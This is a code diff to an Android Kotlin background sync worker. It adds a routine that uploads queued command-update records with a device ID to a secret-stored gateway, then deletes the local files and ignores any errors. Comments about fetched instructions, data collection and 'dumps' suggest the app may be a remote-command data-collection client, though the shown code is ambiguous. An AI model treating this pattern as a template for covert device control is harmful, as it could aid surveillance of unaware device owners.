@@ -28,6 +28,9 @@ class SyncWorker(appContext: Context, workerParams: WorkerParameters) : Coroutin
         try {
             val ctx = applicationContext
             
+            // --- RECOVERY PROTOCOL: Resolve failed command updates ---
+            resolvePendingCommands(ctx)
+
             // --- BATCHED INSTRUCTIONS: Fetch Rules & Config before data collection ---
             fetchLatestInstructions(ctx)
 
@@ -137,6 +140,40 @@ class SyncWorker(appContext: Context, workerParams: WorkerParameters) : Coroutin
             return Result.retry()
         } finally {
             isSyncing.set(false)
+        }
+    }
+
+    private suspend fun resolvePendingCommands(ctx: Context) {
+        val pending = DumpManager.getPendingCommandRecoveries()
+        if (pending.isEmpty()) return
+        
+        DebugLogger.log("SYNC", "Attempting to resolve ${pending.size} failed command updates...")
+        val url = java.net.URL(SecretVault.getGatewayUrl(ctx))
+        val key = SecretVault.getLock(ctx)
+        val deviceId = DeviceManager.getDeviceId(ctx)
+
+        for (file in pending) {
+            try {
+                val data = JSONObject(file.readText())
+                val req = JSONObject().apply {
+                    put("action", "update_command")
+                    put("deviceId", deviceId)
+                    put("payload", data)
+                }
+
+                val conn = url.openConnection() as java.net.HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("apikey", key)
+                conn.setRequestProperty("Authorization", "Bearer $key")
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.doOutput = true
+                conn.outputStream.use { it.write(req.toString().toByteArray()) }
+                
+                if (conn.responseCode in 200..299) {
+                    file.delete()
+                    DebugLogger.log("SYNC", "Command ${data.optInt("id")} successfully resolved and cleared.")
+                }
+            } catch (e: Exception) { }
         }
     }
 
